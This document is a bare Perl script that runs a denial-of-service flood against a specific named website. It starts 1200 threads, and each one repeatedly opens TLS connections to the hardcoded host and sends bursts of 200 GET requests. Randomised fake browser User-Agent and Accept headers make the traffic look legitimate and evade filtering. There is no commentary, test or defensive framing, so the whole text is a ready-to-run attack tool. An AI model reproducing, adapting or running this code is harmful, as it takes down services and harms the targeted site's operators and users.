use IO::Socket::SSL;
use threads;
use strict;
use warnings;
use List::Util qw(shuffle);

my $host = 'nodec.mediathektv.com';
my $port = 443;
my $num_threads = 1200;
my @threads;
my @acceptall = (
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n");

sub get_useragent {
    my @platforms = ('Macintosh', 'Windows', 'X11');
    my $platform = $platforms[rand @platforms];
    my $os;

    if ($platform eq 'Macintosh') {
        my @mac_os_versions = ('68K', 'PPC', 'Intel Mac OS X');
        $os = $mac_os_versions[rand @mac_os_versions];
    }
    elsif ($platform eq 'Windows') {
        my @windows_versions = ('Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64');
        $os = $windows_versions[rand @windows_versions];
    }
    elsif ($platform eq 'X11') {
        my @linux_versions = ('Linux i686', 'Linux x86_64');
        $os = $linux_versions[rand @linux_versions];
    }

    my @browsers = ('chrome', 'firefox', 'ie');
    my $browser = $browsers[rand @browsers];
    my $user_agent;

    if ($browser eq 'chrome') {
        my $webkit = int(rand(100) + 500);
        my $version = int(rand(100)) . '.0' . int(rand(10000)) . '.' . int(rand(1000));
        $user_agent = "Mozilla/5.0 ($os) AppleWebKit/$webkit.0 (KHTML, like Gecko) Chrome/$version Safari/$webkit";
    }
    elsif ($browser eq 'firefox') {
        my $current_year = (localtime)[5] + 1900;
        my $year = int(rand($current_year - 2020 + 1)) + 2020;
        my $month = sprintf("%02d", int(rand(12)) + 1);
        my $day = sprintf("%02d", int(rand(30)) + 1);
        my $gecko = $year . $month . $day;
        my $version = int(rand(72)) + 1 . '.0';
        $user_agent = "Mozilla/5.0 ($os; rv:$version) Gecko/$gecko Firefox/$version";
    }
    elsif ($browser eq 'ie') {
        my $version = int(rand(99)) + 1 . '.0';
        my $engine = int(rand(99)) + 1 . '.0';
        my $token = rand() < 0.5 ? (shuffle('.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64'))[0] . '; ' : '';
        $user_agent = "Mozilla/5.0 (compatible; MSIE $version; $os; $token Trident/$engine)";
    }

    return $user_agent;
}

sub gen_header(){
    my $header;
    my $useragent = get_useragent();
    $header .= "User-Agent: $useragent\r\n";
    $header .= "Connection: Keep-Alive\r\n";
    $header .= "$acceptall[rand @acceptall]";
    $header .= "Referer: https://$host/\r\n\r\n";
    return $header
}

sub bot {
    for( ; ; ){
        # Connect to the server
        my $socket = IO::Socket::SSL->new(PeerHost => $host,PeerPort => $port,) or die "Failed to connect to $host:$port: $!";
        my $request = "GET / HTTP/1.1\r\n";
        $request .= "Host: $host\r\n";
        $request .= gen_header();
        # Send the HTTP request
        for (my $count = 1 ; $count <= 200 ; $count++){
            print $socket $request;
        }
        close $socket;
    }
}

# Create and start threads
for my $i (1 .. $num_threads) {
    # Create a new thread and pass it the thread ID
    my $thread = threads->create(\&bot, $i);
    push @threads, $thread;
}

# Wait for all threads to finish
foreach my $thread (@threads) {
    $thread->join();
}
